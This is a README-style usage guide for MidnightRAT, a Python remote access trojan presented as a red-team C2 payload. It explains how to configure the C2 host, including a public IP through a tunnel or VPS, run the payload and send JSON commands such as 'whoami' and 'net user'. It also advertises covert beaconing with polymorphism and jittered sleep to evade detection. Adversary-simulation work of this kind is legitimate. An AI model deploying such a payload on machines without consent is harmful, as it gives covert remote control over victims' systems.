# 🧪 MidnightRAT — Usage Guide

**Author:** Syed Sharjeel Zaidi  
**Tool:** MidnightRAT Payload  
**License:** MIT  
**Category:** Red Team / Adversary Simulation / C2 Payload

---

## ⚠️ Legal Disclaimer

> This tool is created strictly for **educational purposes and authorized red team use only**.  
>
> ❌ Do NOT use on unauthorized systems or networks.  
> ✅ Always have **explicit permission** when deploying this in any environment.  
> 🧠 The author holds **no responsibility** for any misuse or damage caused by this tool.

---

## 📌 Overview

**MidnightRAT** is a Python-based encrypted C2 payload that allows a red teamer to:

- Execute system-level commands remotely
- Maintain covert communication with a C2 server
- Use runtime polymorphism and adaptive sleep to evade detection

It's designed for ethical hacking labs, adversary simulations, malware analysis, and detection engineering.

---

## 🧰 Prerequisites

- ✅ Python 3.8 or newer
- ✅ pip installed
- ✅ Test environment (VM, sandbox, or safe lab machine)

---

## 📦 Step 1: Clone the Repository

```bash
git clone https://github.com/syedsharjeelshah/MidnightRAT.git
cd MidnightRAT
```

## 📥 Step 2: Install Dependencies

```bash
pip install -r requirements.txt
```

## ⚙️ Step 3: Configure the RAT Payload

- Open midnight_rat.py and locate this line:

```bash
agent = MidnightRAT(c2_host="127.0.0.1", c2_port=8080)
```

| Scenario                    | Example                                     |
| --------------------------- | ------------------------------------------- |
| 🔁 Local testing            | `127.0.0.1`                                 |
| 🌐 Remote lab               | Your local IP, e.g., `192.168.1.10`         |
| 🧪 Public test (VPN/tunnel) | Your public IP or domain (ngrok, VPS, etc.) |

## 📡 Step 4: Start the C2 Listener

## 🚀 Step 5: Run the RAT Payload

- On the test machine or VM, run the payload:

```bash
python midnight_rat.py
```

MidnightRAT will:

- Connect to the configured C2 server
- Sleep (with jitter) between beacons
- Receive commands
- Execute them
- Send encrypted results back

## 📤 Step 6: Send Supported Commands

MidnightRAT accepts encrypted JSON-formatted commands.

| Command    | Description                           |
| ---------- | ------------------------------------- |
| `whoami`   | Show current user                     |
| `ipconfig` | Show IP info (Windows)                |
| `ls`       | List directory contents (Linux/macOS) |
| `net user` | Show local user accounts (Windows)    |

Example Command Payload:

```bash
{
  "type": "syscall",
  "data": "whoami"
}
```
